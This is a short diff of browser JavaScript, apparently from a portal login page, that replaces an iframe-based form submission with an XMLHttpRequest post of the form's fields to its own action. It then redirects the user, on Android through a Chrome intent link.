@@ -14,21 +14,30 @@ for(var j=0;j<labels.length;j++)labels[j].style.display="none";
 var form=document.querySelector("form");
 var btn=document.querySelector("button,input[type=submit]");
 if(btn&&form){
-var iframe=document.createElement("iframe");
-iframe.name="auth_frame";
-iframe.style.display="none";
-document.body.appendChild(iframe);
-form.target="auth_frame";
-form.addEventListener("submit",function(){
-setTimeout(function(){
+form.onsubmit=function(e){if(e)e.preventDefault();return false;};
+btn.addEventListener("click",function(e){
+e.preventDefault();
+e.stopPropagation();
+e.stopImmediatePropagation();
+var data="";
+var fi=form.querySelectorAll("input,select,textarea");
+for(var k=0;k<fi.length;k++){
+if(fi[k].name)data+=(data?"&":"")+encodeURIComponent(fi[k].name)+"="+encodeURIComponent(fi[k].value);
+}
+var xhr=new XMLHttpRequest();
+xhr.open(form.method||"POST",form.action,true);
+xhr.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
+xhr.onload=xhr.onerror=function(){
 if(isAndroid){
 window.location.href="intent://1cinemas.co.in/POP/OrderPortal/start#Intent;scheme=https;package=com.android.chrome;end";
 setTimeout(function(){window.location.href=menuUrl;},800);
 }else{
 window.location.href=menuUrl;
 }
-},1500);
-});
+};
+xhr.send(data);
+return false;
+},true);
 }
 }
 setup();
